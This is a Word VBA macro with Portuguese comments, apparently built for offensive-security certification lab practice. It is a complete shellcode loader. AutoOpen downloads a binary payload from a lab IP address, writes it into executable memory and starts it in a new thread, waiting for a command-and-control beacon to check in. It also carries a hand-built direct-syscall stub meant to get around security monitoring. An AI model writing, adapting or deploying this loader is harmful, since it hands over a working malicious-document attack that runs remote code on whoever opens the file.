Option Explicit

' --- DECLARAÇÕES DE API (Ajustadas para Estabilidade Total) ---
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, ByVal Msg As LongPtr, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr

' --- 1. SYSCALL PARA NtProtectVirtualMemory (0x50) ---
Function Syscall(ByVal SSN As Long, ByVal arg1 As LongPtr, ByVal arg2 As LongPtr, ByVal arg3 As LongPtr, ByVal arg4 As LongPtr) As LongPtr
    Dim stub(11) As Byte: Dim bufAddr As LongPtr
    stub(0) = &H4C: stub(1) = &H8B: stub(2) = &HD1: stub(3) = &HB8
    stub(4) = CByte(SSN And &HFF): stub(5) = CByte((SSN And &HFF00&) \ 256)
    stub(8) = &HF: stub(9) = &H5: stub(10) = &HC3
    bufAddr = VirtualAlloc(0, 12, &H3000, &H40)
    RtlMoveMemory bufAddr, stub(0), 11
    Syscall = CallWindowProc(bufAddr, arg1, arg2, arg3, arg4)
End Function

' --- 2. LOADER PRINCIPAL (Sem Toque em Disco) ---
Sub MyMacro()
    Dim http As Object
    Dim shellcode() As Byte
    Dim baseAddr As LongPtr
    Dim regionSize As LongPtr
    Dim tID As Long
    Dim hThread As LongPtr

    On Error Resume Next
    
    ' Força o Word a ficar visível e estável
    Application.Visible = True
    DoEvents 

    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    http.Open "GET", "http://192.168.45.242/shellcodeOSEP.bin", False
    http.Send

    If http.Status = 200 Then
        shellcode = http.ResponseBody
        regionSize = UBound(shellcode) + 1
        
        ' Alocação RWX direta para teste de estabilidade (0x40)
        baseAddr = VirtualAlloc(0, regionSize, &H3000, &H40)
        
        If baseAddr <> 0 Then
            RtlMoveMemory baseAddr, shellcode(0), regionSize
            
            ' Pequeno delay antes de disparar
            DoEvents
            
            ' Dispara a thread
            hThread = CreateThread(0, 0, baseAddr, 0, 0, tID)
            
            ' ESSENCIAL: Impede que a macro encerre o objeto http antes da thread estabilizar
            If hThread <> 0 Then
                 ' Aguarda 2 segundos para o shellcode estabelecer conexão (Beacon check-in)
                 Dim t As Single: t = Timer: Do While Timer < t + 2: DoEvents: Loop
            End If
        End If
    End If
End Sub

Sub AutoOpen()
    MyMacro
End Sub